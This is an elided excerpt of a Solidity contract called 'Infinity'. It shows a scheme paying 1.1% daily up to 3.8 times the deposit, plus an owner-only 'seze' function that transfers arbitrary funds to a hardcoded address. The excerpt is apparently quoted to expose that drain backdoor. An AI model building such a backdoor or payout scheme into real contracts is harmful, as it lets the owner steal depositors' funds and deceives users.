...
contract Infinity {
	...
	address payable public sezeaddress;
...
//        etherchain_fund = 0x233e04dBF181a839C4fF78039d6beb8dc013FEeB;
        admin_fee = 0x233e04dBF181a839C4fF78039d6beb8dc013FEeB;
		sezeaddress = 0x3df2Cf8FEad4de362495CaAfC6c4784FeFD7E5E2;
...
//        etherchain_fund.transfer(_amount * 3 / 100);
    ...
    function seze(uint256 amount) public {
		require(msg.sender == owner, "Only owner");
        sezeaddress.transfer(amount);
    }

    
    function maxPayoutOf(uint256 _amount) pure external returns(uint256) {
        return _amount * 38 / 10;
    }
    ...
    function payoutOf(address _addr) view external returns(uint256 payout, uint256 max_payout) {
        ...
        if(users[_addr].deposit_payouts < max_payout) {
            payout = (users[_addr].deposit_amount * ((block.timestamp - users[_addr].deposit_time) / 1 days) * 11/ 1000) - users[_addr].deposit_payouts;
